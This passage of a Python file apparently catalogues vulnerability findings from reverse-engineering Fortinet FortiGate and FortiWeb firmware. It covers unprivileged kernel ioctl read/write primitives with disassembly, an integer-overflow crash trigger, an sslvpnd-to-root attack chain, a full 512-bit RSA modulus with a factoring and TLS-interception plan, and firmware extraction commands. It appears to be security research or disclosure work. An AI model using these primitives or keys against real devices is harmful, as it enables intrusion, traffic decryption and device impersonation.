copy_to_user(user_ptr, &kbuf, 36)     ; return 28 bytes of object data to user
return 0
""",

    "leaked_object_layout": {
        "+0x00": "NOT leaked (first 4 bytes of object — possibly magic/type)",
        "+0x04": "leaked at user_out[8:16]",
        "+0x0c": "leaked at user_out[16:24]",
        "+0x14": "leaked at user_out[24:32]",
        "+0x1c": "leaked at user_out[32:36] (DWORD only, 4 bytes)",
    },

    "utility": (
        "Combined with FGT-F19 (0x9004 write), allows read-before-write: "
        "attacker reads object state via 0x9003, infers object type from field values, "
        "then writes targeted value to field+0x44 via 0x9004. "
        "Also useful for runtime object discovery: "
        "iterate index 0..0x40 with 0x9003 to find populated slots."
    ),

    "status": "CONFIRMED attack primitive — 28 bytes of runtime kernel object data readable by any process via bounded index; impact scales with what data the registered objects contain",
}

# ─────────────────────────────────────────────────────────
# FGT-F21 — ioctl 0x9005 unauth kernel global read + 0x9009 conditional read
# ─────────────────────────────────────────────────────────
FGT_F21_IOCTL_0x9005_UNAUTH_GLOBAL_READ = {
    "id": "FGT-F21",
    "product": "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "LOW-MEDIUM — unauth kernel data disclosure; runtime impact depends on global content",
    "class": "Unauth kernel global read via ioctl 0x9005 (and 0x9009 conditionally)",

    "0x9005_x86_800": {
        "foff_handler": "0x55c6b0",
        "source_vma": "0xffffffff8188a410",
        "source_foff": "0x188a410 (in vmlinux .data section, zero in static image)",
        "source_note": "0x30 bytes before the object table at 0xffffffff8188a440",
        "transfer": "copy_to_user(user_ptr, &global, 4) -- 4 bytes unconditional",
        "privilege_gate": "ABSENT -- no privilege check before copy_to_user",
        "disasm": [
            "mov edx, 4",
            "mov rsi, 0xffffffff8188a410  ; source global",
            "mov rdi, r12                 ; user dst",
            "call copy_to_user            ; 0x80601b00",
            "xor ebx, ebx                 ; return 0",
        ],
    },

    "0x9009_x86_800": {
        "foff_handler": "0x55c5ef",
        "global_vma": "0xffffffff8188a410 (same as 0x9005)",
        "condition": "object[+0x30] == 3 (signed 32-bit comparison)",
        "disasm": [
            "call copy_from_user(stack, user, 4)   ; read index",
            "cmp edi, 0x40                          ; bounds check",
            "call object_lookup(index)",
            "movsxd rbx, [rax+0x30]                ; read object[+0x30]",
            "cmp ebx, 3",
            "jne epilogue                           ; if != 3, return field value directly",
            "movsxd rbx, [rip+0x132dddd]           ; rip+offset = 0xffffffff8188a410",
            "jmp epilogue                           ; return global value",
        ],
        "dual_behavior": (
            "If object[+0x30] != 3: returns object[+0x30] itself (leaks object field). "
            "If object[+0x30] == 3: returns the runtime global at 0x8188a410 (leaks Fortinet global). "
            "Either case: no privilege check."
        ),
    },

    "runtime_global_significance": (
        "0xffffffff8188a410 is 0x30 bytes before the 64-slot Fortinet object table (0x8188a440). "
        "At runtime: populated by Fortinet daemon init. "
        "In static vmlinux: zero (BSS). "
        "Could contain: slot count, version tag, init flag, or a kernel pointer. "
        "If it contains a kernel pointer: FGT-F21 enables KASLR bypass for any local process."
    ),

    "arm64_800": {
        "foff_handler": "0x2dfb28",
        "source_foff_in_image": "0x10f17c0 (in ARM64 image BSS, beyond file at 0x10b4a00)",
        "source_note": "PC-relative ADRP offset 0xe12000 from ioctl handler -> BSS global",
        "confirmed": True,
    },

    "status": "CONFIRMED class, runtime value unknown (BSS in static binary). KASLR bypass potential if global contains kernel pointer.",
}

# ─────────────────────────────────────────────────────────
# FGT-F22 — ioctl 0x9007 unauth kernel string-write primitive
# ─────────────────────────────────────────────────────────
FGT_F22_IOCTL_0x9007_STRING_WRITE = {
    "id": "FGT-F22",
    "product": "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "HIGH — unauth controlled heap allocation + kernel string write; DoS confirmed (FGT-F16); escalation path depends on 0x55db6d semantics",
    "class": "Unauth controlled kernel heap allocation + string injection via ioctl 0x9007",

    "x86_800": {
        "foff_handler": "0x55c73d",
        "input_layout": {
            "bytes_0_3": "index (DWORD) -- passed to 0x55db6d",
            "bytes_4_7": "size (DWORD) -- controls allocation size",
            "bytes_8_15": "user_ptr (QWORD) -- source of string data",
        },
        "total_input": "16 bytes from user, no privilege check",
        "flow": [
            "copy_from_user(stack, user, 16)         ; read 16 bytes",
            "lea edi, [size + 1]                     ; 32-bit ADD -> wraps to 0 if size=0xffffffff",
            "movsxd rdi, edi                         ; sign-extend",
            "kmalloc(rdi, GFP_KERNEL|0xc0)           ; allocates size+1 bytes",
            "copy_from_user(kmalloc_buf, user_ptr, size)  ; copies string from user ptr",
            "kmalloc_buf[size] = 0x00                ; null-terminate",
            "call 0x55db6d(index, kmalloc_buf)       ; Fortinet string-op with index+buf",
            "call 0x42774f(kmalloc_buf)              ; release/unmap heap buf",
        ],
        "privilege_gate": "ABSENT",
        "integer_overflow": (
            "If size=0xffffffff: lea edi=[0xffffffff+1]=0 (32-bit wrap). "
            "kmalloc(0) returns valid SLUB ptr (~64 bytes). "
            "Then copy_from_user(kmalloc_buf, user_ptr, 0xffffffff). "
            "Fortinet custom copy_from_user: memset(heap, 0, SIZE_MAX) via rep stosq -> CRASH. "
            "This is the FGT-F16 DoS primitive specifically triggered via ioctl 0x9007 with size=0xffffffff."
        ),
        "post_overflow_null_write": (
            "After copy_from_user: `mov byte ptr [r12 + rax], 0` where r12=kmalloc_buf, rax=size. "
            "For size=0xffffffff: writes 0 to kmalloc_buf+0xffffffff (4GB past allocation head). "
            "For normal sizes: legitimate null terminator at end of allocated region."
        ),
        "0x55db6d_analysis": {
            "function": "String query oracle -- NOT an injection primitive",
            "prototype": "int query(int index, const char *kernel_string)",
            "flow": [
                "bounds check: index <= 0x40",
                "object_lookup: rbx = *(index * 8 - 0x7e775bc0) -- separate table from 0x9003/0x9004",
                "read object[+0x30]: if == 3 -> early path (0x55dc44); if == 2 -> early path (0x55dc34)",
                "call 0xcd7331(string) -- strlen / string hash",
                "call 0x454280(0, string) -- hash -> bucket index (result & 0xf, then shl 4)",
                "walk doubly-linked list at object[+0x3a8 + bucket*0x10]",
                "compare hash and string (0xcd724f) against each list entry",
                "return value: bit from object[+0x390] >> 1 & 1 (0 or 1 boolean)",
            ],
            "semantics": (
                "Looks up a string key in a per-object hash table. "
                "Returns a single bit from object[+0x390] -- a status/capability flag. "
                "The user string is the QUERY KEY, not an injected value. "
                "No persistent write: heap buffer freed by 0x42774f after lookup. "
                "0x9007 is a boolean oracle: 'does this string key exist in object N's table?'"
            ),
            "object_table_note": (
                "0x55db6d uses a DIFFERENT object table base than 0x9003/0x9004/0x9009. "
                "0x55db6d: base = (index * 8) + 0xffffffff817aa440. "
                "0x9003/0x9004/0x9009: base = 0xffffffff8188a440 (via 0x55ce3b). "
                "Both objects share the [+0x30] field with sentinel values 2 and 3 -- same object class."
            ),
        },
    },

    "arm64_800": {
        "foff_handler": "0x2dfa2c",
        "equivalent_overflow": "add w0, w0, #1 on w0=0xffffffff wraps to 0 (same 32-bit wrap)",
        "arm64_dos_status": "NOT confirmed -- standard ARM64 copy_from_user rejects SIZE_MAX (access_ok correct). Integer overflow to kmalloc(0) occurs but error path returns EFAULT cleanly.",
        "note": "ARM64 0x9007 has the overflow but lacks the DoS crash. Boolean oracle primitive still present for valid sizes.",
    },

    "revised_impact": {
        "primary": "DoS (FGT-F16 path) -- size=0xffffffff causes kernel crash via rep stosq (x86-64 only)",
        "secondary": "Boolean oracle -- enumerate what string keys exist in each kernel object's internal hash table",
        "no_injection": "0x55db6d does NOT store user data in the kernel. The string is query-only; heap buffer freed on return.",
    },

    "status": "CONFIRMED -- DoS primitive via FGT-F16 path. Boolean query oracle confirmed (returns 0/1 capability bit from kernel object). Injection vector NOT present.",
}

# ---------------------------------------------------------
# FGT-F23: x86-64 8.0.0 kernel frozen at Linux 4.19.13 (Jan 2019 base, EOL Dec 2024)
# ---------------------------------------------------------
FGT_F23_KERNEL_FROZEN_BASE = {
    "id":       "FGT-F23",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (x86-64)",
    "severity": "HIGH -- kernel base is Linux 4.19.13 (January 2019); shipped April 2026; "
                "EOL in upstream December 2024; missing 300+ point-release security patches",
    "class":    "End-of-life / frozen kernel base (CWE-1395: use of expired third-party component)",

    "kernel_id": {
        "version":    "4.19.13",
        "build_date": "2026-04-20 17:10:46",
        "builder":    "root@6dd369a4a2ab",
        "smp":        True,
        "format":     "bzImage (7.7MB)",
        "path_in_image": "/flatkc (ext2 partition sector 2048)",
    },

    "version_context": {
        "4.19.13_release":  "2019-01-15 (part of 4.19 LTS series)",
        "4.19_lts_eol":     "2024-12-31 (kernel.org LTS page)",
        "4.19_final":       "4.19.325+ by EOL",
        "point_release_delta": "300+ point releases between 4.19.13 and final 4.19 LTS",
        "shipped":          "2026-04-20 (FortiOS 8.0.0.F build0167) -- 4 months after EOL",
    },

    "vs_709_kernel": {
        "709_kernel":       "Linux 3.2.16 (2012, missing SMEP/SMAP/kASLR/KPTI entirely)",
        "800_kernel":       "Linux 4.19.13 (2019, SMEP/SMAP/kASLR/KPTI all present)",
        "improvement":      "4.19 is a much better security baseline than 3.2.16",
        "remaining_gap":    "4.19.13 frozen base misses all upstream fixes from 4.19.14-4.19.325; "
                            "Fortinet presumably backports some CVEs but the delta is unknown without diff",
    },

    "notable_missing_patches_by_era": (
        "The 4.19.13 -> 4.19.325 delta spans 2019-2024. "
        "High-profile kernel vulnerabilities in that window include: "
        "CVE-2021-4154 (use-after-free cgroup1), CVE-2022-0847 (Dirty Pipe), "
        "CVE-2022-1015 (netfilter nf_tables OOB write), CVE-2023-0266 (ALSA use-after-free), "
        "CVE-2023-32233 (netfilter use-after-free), CVE-2024-1086 (netfilter use-after-free). "
        "Whether Fortinet backported these is not confirmed without patch analysis."
    ),

    "kernel_security_features": {
        "smep":     "present (x86 SMEP added in Sandy Bridge era, supported by 4.19)",
        "smap":     "present",
        "kaslr":    "present (added 3.14)",
        "kpti":     "present (added 4.15 for Spectre/Meltdown)",
        "cfi":      "absent (not in mainline 4.19)",
        "kcfi":     "absent",
    },

    "boot_string": "Linux version 4.19.13 (root@6dd369a4a2ab) #1 SMP Mon Apr 20 17:10:46 America 2026",
    "verification": "CONFIRMED -- file(1) output on extracted /flatkc from disk_p1.raw (ext2 sector 2048)",
}


# ---------------------------------------------------------
# FGT-F24: eBPF WAD kernel dispatcher (wad_dispatcher_kern.ebpf in rootfs)
# ---------------------------------------------------------
FGT_F24_EBPF_WAD_DISPATCHER = {
    "id":       "FGT-F24",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (x86-64)",
    "severity": "INFO -- eBPF program in rootfs; kernel-level hook; attack surface if rootfs write is achievable",
    "class":    "Custom eBPF kernel program (potential kernel privilege escalation vector if loadable eBPF is replaceable)",

    "file": {
        "path":         "/lib/wad_dispatcher_kern.ebpf",
        "sha256":       "dfad7b4b8bad9702e2a4349479a45c9c4df7560a6c34ffc4afb0db16a9dc0a58",
        "source":       "hash_bin.sha256 manifest from unencrypted ext2 partition",
    },

    "context": (
        "WAD (web application daemon) is FortiOS's deep packet inspection engine. "
        "wad_dispatcher_kern.ebpf is a custom eBPF program loaded into the kernel at runtime, "
        "implementing a WAD packet dispatcher at the kernel network level. "
        "Custom eBPF programs run in the kernel after passing the eBPF verifier; "
        "if the eBPF bytecode file can be replaced before loading (rootfs write access), "
        "malicious eBPF could bypass the WAD fortism security domain entirely. "
        "The eBPF verifier will reject invalid programs; a replacement must be valid eBPF bytecode."
    ),

    "security_model_note": (
        "The fortism LSM governs file access by domain. WAD runs in the WAD domain (EXCLUDE, chroot /tmp/wad/jail). "
        "If the eBPF file is loaded BEFORE WAD's chroot, it may run outside the chroot constraint. "
        "Attack chain: write access to rootfs -> replace wad_dispatcher_kern.ebpf -> WAD loads malicious eBPF -> kernel-level packet manipulation or privilege escalation."
    ),

    "verification": "INDIRECT -- hash manifest only; eBPF file not yet extracted or disassembled",
}


# ---------------------------------------------------------
# FGT-F25: hash_bin.sha256 exposes rootfs binary manifest from unencrypted partition
# ---------------------------------------------------------
FGT_F25_ROOTFS_MANIFEST_LEAK = {
    "id":       "FGT-F25",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (x86-64)",
    "severity": "INFO -- unencrypted partition discloses complete rootfs file inventory (path + SHA-256 per file)",
    "class":    "Information disclosure; file enumeration without rootfs decryption",

    "file": {
        "path":       "/hash_bin.sha256 (ext2 partition, sector 2048)",
        "format":     "SHA-256 hex  <path>  (one entry per line)",
        "entry_count": 410,
    },

    "notable_disclosed_paths": {
        "/bin/node":                      "Node.js binary; SHA-256=1de035e241f616ee3201bfb90d516425191c111e727155b72356e8535cab49f2",
        "/node-scripts/chunk-*.js":       "20+ webpack bundle chunks; FortiOS web management UI JS backend",
        "/lib/wad_dispatcher_kern.ebpf":  "eBPF kernel program (FGT-F24)",
        "/lib/ossl-modules/oqsprovider.so": "Open Quantum Safe OpenSSL provider (post-quantum crypto: Kyber/Dilithium)",
        "/lib/ossl-modules/tpm2.so":      "TPM2 OpenSSL provider (consistent with hardware TPM in ARM64 FGA-F04)",
        "/lib/ossl-modules/fips.so":      "FIPS 140 OpenSSL provider",
        "/lib/libIPSec_MB.so.1":          "Intel Multi-Buffer Cryptography Library (hardware-accelerated IPsec)",
        "/lib/cert/subcacert2.pem":       "Sub-CA certificate (chain component)",
        "/lib/cert/DigicertCA.ca":        "DigiCert CA (firmware signing timestamp chain)",
        "/bin/ftk.o":                     "Fortinet kernel toolkit object (purpose unknown; not a .ko)",
        "/usr/local/lib/open-vm-tools/":  "VMware Tools plugins (confirm VM target environment)",
    },

    "attack_use": (
        "An attacker with access to the ext2 partition (physical access, or device extraction) "
        "can enumerate all files in the encrypted rootfs without decryption. "
        "Useful for: targeting specific binary analysis, identifying attack surface, "
        "comparing hash values across firmware versions to identify changed files."
    ),

    "verification": "CONFIRMED -- hash_bin.sha256 extracted from ext2 partition via debugfs on disk_p1.raw",
}


# FGT-F26: fortism LSM policy config nullifies NX/DEP for 35/36 daemons (FGT 7.4.12)
# Source: datafs.tar.gz from FGT 7.4.12 VM64-KVM (unencrypted partition)
# ---------------------------------------------------------
FGT_F26_FORTISM_LSM_NX_NULLIFICATION = {
    "id":       "FGT-F26",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM policy config)",
    "severity": "HIGH -- fortism LSM policy grants anon-mem-exec=1, heap-exec=1, stack-exec=1, "
                "regain-root=1 to 35/36 daemon security domains; NX/DEP kernel enforcement "
                "is effectively disabled for all major Fortinet daemons",
    "class":    "LSM Policy Misconfiguration -- NX/DEP Nullification across daemon security domains",

    "source_file": "datafs.tar.gz -> etc/fortism_config.json",

    "affected_domains": {
        "total": 36,
        "permissive_count": 35,
        "restricted_count": 1,
        "restricted_domain": "TERMINAL (id=2: sshd, telnetd) -- anon-mem-exec=0, heap-exec=0, stack-exec=0",
        "permissive_flags_per_domain": {
            "anon-mem-exec": 1,
            "heap-exec":     1,
            "stack-exec":    1,
            "file-mod-exec": 1,
            "regain-root":   1,
        },
        "high_value_permissive_domains": [
            "SSLVPND (id=5)  -- /bin/sslvpnd; internet-facing; all exec flags =1",
            "WEB_SVC (id=?) -- /bin/node; management UI backend; all exec flags =1",
            "ALL_ACCESS     -- /bin/httpsd, /bin/fnbamd, /bin/scimd, /bin/confsyncd, "
            "/bin/extenderd, /bin/forticron, /bin/hasync, /bin/http_authd; all flags =1",
            "WAD            -- /bin/wad; SSL inspection proxy; all flags =1",
            "CMDBSVR        -- /bin/cmdbsvr; config database; all flags =1",
            "FORTICLDD      -- /bin/forticldd; cloud daemon; all flags =1",
            "FGFMD          -- /bin/fgfmd; FortiGate fleet management daemon; all flags =1",
        ],
    },

    "security_implication": (
        "The fortism LSM module is Fortinet's proprietary Linux Security Module that enforces "
        "domain-based memory execution policy. When anon-mem-exec=1, the LSM permits mmap(PROT_EXEC) "
        "on anonymous memory (shellcode staging). When heap-exec=1, the LSM permits mprotect() "
        "to mark heap pages executable. When stack-exec=1, executable stack is permitted. "
        "When regain-root=1, privilege re-escalation to root is not blocked by the LSM. "
        "With all four flags set to 1, the fortism LSM provides ZERO NX/DEP enforcement "
        "for the affected domain. Any memory corruption vulnerability in those daemons "
        "(sslvpnd, httpsd, wad, cmdbsvr, node, fnbamd, etc.) gets direct shellcode staging "
        "without needing a ROP chain. The kernel's hardware NX bit still applies at the "
        "hardware level, but the LSM enforcement layer that would block mprotect/mmap-exec "
        "transitions is configured to allow them unconditionally."
    ),

    "contrast_ffw_800": {
        "product":   "Fortinet FortiWeb 8.0.0 VM64-KVM",
        "source":    "datafs.tar.gz -> etc/fortism_config.json (// comments stripped, trailing commas fixed)",
        "total_domains": 44,
        "anon_exec_only_count": 6,
        "anon_exec_only_domains": [
            "PRECHROOT (id=3)  -- anon-mem-exec=1, default_act=INCLUDE (pre-chroot init stage)",
            "CMDBSVR  (id=6)   -- anon-mem-exec=1, default_act=INCLUDE (config DB)",
            "MISC     (id=8)   -- anon-mem-exec=1, default_act=INCLUDE (misc init daemons)",
            "WAD      (id=10)  -- anon-mem-exec=1, default_act=EXCLUDE (SSL proxy -- JIT required)",
            "IPS      (id=17)  -- anon-mem-exec=1, default_act=EXCLUDE (IPS engine -- JIT required)",
            "WEB_SVC  (id=23)  -- anon-mem-exec=1, default_act=EXCLUDE (web service -- node JIT)",
        ],
        "absent_flags_all_domains": ["heap-exec", "stack-exec", "file-mod-exec", "regain-root"],
        "default_act_pattern": (
            "FFW ids 0-8 (INIT/CONSOLE/TERMINAL/PRECHROOT/GUI/CMDBSVR/INTERNAL/MISC) use "
            "default_act=INCLUDE (bootstrap/admin layer). Operational daemon domains (id >= 9) "
            "uniformly use default_act=EXCLUDE (deny-by-default). "
            "FGT 7.4.12 uses default_act=INCLUDE for ALL 35 permissive domains -- including "
            "SSLVPND, WAD, WEB_SVC, FGFMD, FORTICLDD. No operational daemon is EXCLUDE."
        ),
        "critical_domain_comparison": {
            "SSLVPND": "FFW id=9: anon=0 heap=0 stack=0 root=0 default=EXCLUDE (fully restricted) "
                       "vs FGT id=5: anon=1 heap=1 stack=1 root=1 default=INCLUDE (all bypassed)",
            "WAD":     "FFW id=10: anon=1 heap=0 stack=0 root=0 default=EXCLUDE (JIT only, deny-default) "
                       "vs FGT: anon=1 heap=1 stack=1 root=1 default=INCLUDE",
            "FGFMD":   "FFW id=22: anon=0 heap=0 stack=0 root=0 default=EXCLUDE "
                       "vs FGT: anon=1 heap=1 stack=1 root=1 default=INCLUDE",
            "WEB_AUTH":"FFW id=39: anon=0 heap=0 stack=0 root=0 default=EXCLUDE "
                       "(same domain that loads fgt_512.crt -- Fortism restricts it properly in FFW)",
            "SSHD":    "FFW id=35: anon=0 heap=0 stack=0 root=0 default=EXCLUDE",
        },
        "conclusion": (
            "FFW 8.0.0 demonstrates Fortism CAN enforce deny-by-default policy with no heap/stack "
            "execution rights for any domain. The FGT 7.4.12 config is not a build baseline -- it is "
            "a deliberate architectural choice to grant all exec bypass flags to every operational daemon. "
            "The mechanism exists and works in FortiWeb; FortiGate opted out of it."
        ),
    },

    "attack_chain": (
        "Memory corruption in sslvpnd (pre-auth, internet-facing) -> "
        "anon-mem-exec=1 permits mmap(PROT_EXEC) for shellcode staging -> "
        "regain-root=1 permits uid(0) restoration after sandbox escape -> "
        "full root shell without ROP chain requirement. "
        "Eliminates NX/DEP as a mitigation for the highest-value attack surface on the device."
    ),

    "verification": "CONFIRMED -- etc/fortism_config.json extracted from datafs.tar.gz (unencrypted "
                    "partition). 35 domains counted with all five exec flags =1. "
                    "FFW 8.0.0 fortism_config.json extracted for cross-product comparison.",
    "status": "CONFIRMED",
}


# FGT-F27: FGT 7.4.12 shares static RSA fgt2.key with FGT 8.0.0 + FFW 8.0.0 (cross-version scope)
# Source: datafs.tar.gz from FGT 7.4.12 VM64-KVM (unencrypted partition)
# ---------------------------------------------------------
FGT_F27_FGT7412_SHARED_KEY_SCOPE_EXTENSION = {
    "id":       "FGT-F27",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fgt2.key scope extension)",
    "severity": "CRITICAL -- same static RSA private key present across FGT 7.4.12 and FGT/FFW 8.0.0; "
                "key compromise affects all major FortiOS version branches simultaneously",
    "class":    "Cryptographic Key Reuse -- cross-product, cross-version shared static RSA private key",

    "source_file": "datafs.tar.gz -> etc/fgt2.key",

    "modulus_prefix": "A75C115F690B67C32834D43FE1BD50DB301CE34F6A96EACDD6AE16353E72715AA8893B03",

    "confirmed_products_same_key": [
        "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM     -- fgt2.key (this finding, datafs.tar.gz)",
        "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM      -- fgt2.key (FGT-F05 in this module)",
        "Fortinet FortiGate FortiOS 8.0.0 ARM64 (FGA)   -- fgt2.key (FGA-F01 in fortigate_arm64_re)",
        "Fortinet FortiWeb FortiOS 8.0.0 VM64-KVM        -- fgt2.key (FFW-F05 in fortiweb_re)",
    ],

    "version_span": (
        "Key confirmed identical across both 7.4.x (7.4.12) and 8.0.x (8.0.0) major branches. "
        "These are separate release trains with distinct feature sets and patch cycles; "
        "shipping the same static private key across both confirms the key was never rotated "
        "during the 7.x -> 8.x product generation boundary."
    ),

    "impact": (
        "A single private key compromise (via FGT-F09 rootfs key extraction, fortism ioctl "
        "kernel-level compromise, or any other path) gives an attacker the material to: "
        "(1) impersonate any FortiGate or FortiWeb device in TLS mutual authentication, "
        "(2) decrypt traffic protected by this key pair across both 7.4.x and 8.0.x deployments, "
        "(3) forge firmware signatures if fgt2.key is used in firmware integrity verification chain. "
        "Scope: all FortiGate and FortiWeb devices running these firmware lines (global install base)."
    ),

    "cross_ref": {
        "FGT-F09": "rootfs AES key -- path to decrypt encrypted rootfs and extract key material",
        "FFW-F05": "FortiWeb 8.0.0 same key confirmed",
        "FGA-F01": "FortiGate ARM64 8.0.0 same key confirmed",
    },

    "verification": "CONFIRMED -- openssl rsa -noout -modulus on fgt2.key from FGT 7.4.12 datafs.tar.gz; "
                    "modulus prefix A75C115F... matches all previously confirmed products.",
    "status": "CONFIRMED",
}


# ---------------------------------------------------------
# FGT-F28: 512-bit RSA private key (fgt_512.key) in FGT 7.4.12 datafs
# Source: datafs.tar.gz from FGT 7.4.12 VM64-KVM; FFW 8.0.0 confirmed active in WEB_AUTH domain
# ---------------------------------------------------------
FGT_F28_512BIT_KEY_DATAFS = {
    "id":       "FGT-F28",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fgt_512.key)",
    "severity": "HIGH -- 512-bit RSA private key present in datafs; cryptographically broken (factorable in days); "
                "fortism_config.json for FGT 7.4.12 does NOT reference fgt_512.crt (usage unconfirmed for FGT); "
                "FortiWeb 8.0.0 confirmed active in WEB_AUTH domain (FWB-F13); FGT usage may be via non-fortism path",
    "class":    "Broken Cryptographic Key / 512-bit RSA in Production Firmware",

    "key_details": {
        "file":        "datafs.tar.gz -> etc/fgt_512.key",
        "key_size":    "512-bit RSA (2 primes)",
        "modulus":     "CFB821074C9ADFD7951F8EDAB0229D295BB714B118ECA5F687995AFD5DC0F2DDEDB07E1C0CA300F6846D3D9B958F5AD5AE67D0610D335447EF6B49157D41D2AD",
        "cert_file":   "datafs.tar.gz -> etc/fgt_512.crt",
        "cert_issued": "2011-02-21 (Feb 21, 2011) -- LEGACY cert from 2011; not refreshed",
        "cert_expires": "2038-01-19",
        "cert_issuer": "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=support -- "
                       "old CA (different from FFW 8.0.0 which uses fortinet-subca2003)",
        "cert_sha1":   "10:72:66:65:94:AB:C3:01:4D:CE:EF:62:61:01:37:B2:40:99:CE:43",
        "cert_subject": "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=FortiGate, CN=FortiGate, emailAddress=support@fortinet.com",
    },

    "fgt_usage_status": (
        "FGT 7.4.12 fortism_config.json: zero references to fgt_512 or 512.crt. "
        "Either (a) the key is vestigial/unused in FGT 7.4.12, "
        "(b) loaded during pre-fortism initialization phase, "
        "(c) loaded by a domain in default_act=INCLUDE mode (doesn't need explicit allowlist), "
        "or (d) used in a path not covered by fortism policy. "
        "FGT 7.4.12 fortism has 35/36 domains with all exec flags=1 (FGT-F26) -- "
        "if a permissive domain loads fgt_512.key, fortism would not log or block it."
    ),

    "cross_product": {
        "ffw_800": "CONFIRMED active: WEB_AUTH domain loads fgt_512.crt (FWB-F13); FFW modulus DIFFERENT (B5ED8433...)",
        "fgt_7412": "File present (CFB821074C...); NOT confirmed active via fortism; different modulus from FFW",
        "note": "Both are 512-bit and independently factorable; not cross-product shared (different moduli per product)",
    },

    "exploit_path": (
        "Factor the 512-bit modulus CFB821074C... using CADO-NFS or public RSA factoring service "
        "(512-bit RSA has been publicly factored; <2 days on modern hardware). "
        "If the key is actively used in FGT: forge FortiGate device certificate, "
        "MITM TLS sessions using this cert, decrypt captured traffic. "
        "If the key is vestigial in FGT 7.4.12 but active in other FGT versions: "
        "the cert in datafs would still serve as a forgeable device identity."
    ),

    "cross_ref":  "FWB-F13 -- FortiWeb 8.0.0 WEB_AUTH confirmed active; FGT-F27 -- fgt2.key shared key (different key pair)",

    "verification": "CONFIRMED key file present and parseable -- openssl rsa -noout -text confirms 512-bit, 2 primes; "
                    "fortism_config.json non-reference is negative evidence only",
    "status": "CONFIRMED FILE PRESENT; USAGE UNCONFIRMED IN FGT 7.4.12 FORTISM",
}


# ---------------------------------------------------------
# FGT-F29: Weak cryptographic configuration baseline -- cert.conf 1024-bit CSR default + SSH moduli 1535-bit (FGT 7.4.12)
# Source: datafs.tar.gz from FGT 7.4.12 VM64-KVM (unencrypted partition)
# ---------------------------------------------------------
FGT_F29_WEAK_CRYPTO_CONFIG_BASELINE = {
    "id":       "FGT-F29",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (crypto configuration baseline)",
    "severity": "LOW -- weak cryptographic defaults in configuration templates; not directly exploitable "
                "but document a consistent pattern of insufficient crypto hygiene alongside FGT-F27/F28",
    "class":    "Weak Cryptographic Configuration -- CSR template 1024-bit default + stale SSH moduli group file",

    "findings": {
        "cert_conf_1024_bit": {
            "file":        "datafs.tar.gz -> etc/cert/cert.conf",
            "field":       "default_bits = 1024",
            "risk":        "1024-bit RSA CSR template; any certificate generated via the local CLI or "
                          "admin-facing 'generate CSR' workflow would default to 1024-bit RSA. "
                          "1024-bit RSA is below NIST SP 800-131A (min 2048-bit since 2012); "
                          "factorable in under one year with well-resourced adversary.",
            "scope":       "Affects admin-generated CSRs only; built-in device certs use separate generation paths",
        },
        "ssh_moduli_1535_bit": {
            "file":        "datafs.tar.gz -> etc/ssh/moduli",
            "source":      "$OpenBSD: moduli,v 1.14 2015/07/22 02:34:59 dtucker Exp $ (unchanged from 2015)",
            "size_dist":   {
                "1535-bit": 49,
                "2047-bit": 40,
                "3071-bit": 37,
                "4095-bit": 38,
                "6143-bit": 37,
                "7679-bit": 36,
                "8191-bit": 29,
            },
            "total_entries": 268,
            "risk":        "49 of 268 DH group entries are 1535-bit (sub-2048-bit). RFC 8270 / NIST SP 800-131A "
                          "require minimum 2048-bit DH groups for SSH key exchange. Modern OpenSSH >= 7.4 "
                          "disables 1535-bit negotiation by default; client negotiation determines actual group used. "
                          "Unmodified 2015 OpenBSD file -- no maintenance over 10+ years.",
            "scope":       "Affects SSH daemon DH group exchange; legacy clients may negotiate 1535-bit group",
        },
    },

    "pattern_context": (
        "FGT 7.4.12 exhibits a consistent weak-crypto pattern: "
        "(1) 512-bit RSA private key in production firmware (FGT-F28), "
        "(2) 1024-bit RSA CSR generation template (FGT-F29a), "
        "(3) unmodified 2015 SSH moduli file including 1535-bit groups (FGT-F29b), "
        "(4) fgt_512.crt issued 2011 (legacy, not refreshed), expiry 2038 (FGT-F28). "
        "None of these are isolated oversights; the pattern indicates crypto baseline maintenance "
        "has not been applied to the platform across version branches."
    ),

    "cross_ref": "FGT-F27 (1024-bit CSR default in cert.conf), FGT-F28 (512-bit key in datafs)",
    "verification": "CONFIRMED -- etc/cert/cert.conf extracted from datafs.tar.gz, field default_bits=1024; "
                    "etc/ssh/moduli md5=b27b6034c05755a41dfec04ce29c09ed, OpenBSD 2015 source confirmed, "
                    "49 x 1535-bit entries counted.",
    "status": "CONFIRMED",
}


# ─────────────────────────────────────────────────────────
# Forensic extraction commands
# ─────────────────────────────────────────────────────────
EXTRACTION_COMMANDS = {
    "qcow2_to_raw": "qemu-img convert -f qcow2 virtioa.qcow2 virtioa.raw",
    "mount_p1": "sudo losetup -o 1048576 --sizelimit 268435456 /dev/loop0 virtioa.raw && sudo mount /dev/loop0 /mnt/p1",
    "extract_cpio": "cd rootfs && cpio -idm < ../mnt/p1/rootfs.gz",
    "decompress_bin_tar": """
import lzma
def fortios_xz_decompress(path):
    data = open(path, 'rb').read()
    block_hdr_size_byte = data[12]
    block_header_len = (block_hdr_size_byte + 1) * 4
    lzma2_start = 12 + block_header_len
    lzma_data = data[lzma2_start:]
    return lzma.LZMADecompressor(
        format=lzma.FORMAT_RAW,
        filters=[{'id': lzma.FILTER_LZMA2, 'preset': 6}]
    ).decompress(lzma_data)
""",
    "extract_tar": "tar -xf bin.tar -C bin_root/",
    "strings_init": "strings bin_root/bin/init | grep -E '(passwd|admin|key|cert|bypass|backdoor)'",
}

# ---------------------------------------------------------
# Analysis status
# ---------------------------------------------------------
ANALYSIS_STATUS = {
    "7.0.9_vm64": "MAIN SOURCE -- virtioa.qcow2 (fortinet-FGT-v7.0.9-build0444); full rootfs extracted",
